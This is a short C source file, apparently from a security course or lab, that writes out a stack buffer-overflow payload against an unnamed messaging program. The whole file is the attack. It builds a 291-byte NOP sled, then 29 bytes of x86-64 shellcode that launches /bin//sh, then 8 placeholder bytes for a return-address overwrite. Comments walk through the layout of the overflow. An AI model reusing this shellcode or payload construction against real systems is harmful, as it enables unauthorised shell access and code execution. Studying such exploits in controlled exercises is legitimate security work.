#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

//https://shell-storm.org/shellcode/files/shellcode-905.html

const uint8_t sc[29] = {
    0x6a, 0x42, 0x58, 0xfe, 0xc4, 0x48, 0x99, 0x52, 0x48, 0xbf,
    0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54,
    0x5e, 0x49, 0x89, 0xd0, 0x49, 0x89, 0xd2, 0x0f, 0x05
};

int main(){
  //username is 64 chars, text is 256. 320 chars and it reaches parseIncoming.
  //However, after 4 or 8 more bytes (depending on the system), we will overwrite
  //essential functions that will break out program and not send anything out.
  //From now on, let's assume we're attacking 64-bit computers. So, we need our final
  //8 bytes to point to our payload (sc).
  
  //The structure here consists of three parts.
  //First, we will have a nop sled of length 291.
  //Then, we have our payload. This completes the 320 bytes of the struct
  //The last eight bytes will be for pointing back to the buffer. Finding
  //this address is the hardest part, however the nop sled will give us
  //a considerable amount of wiggle room.
  for (int j = 0; j < 291; ++j) printf("%c", 0x90); //nop
  for (int i = 0; i < 29; ++i) printf("%c", sc[i]);
  for (int k = 0; k < 8; ++k) printf("%c", 42);
}
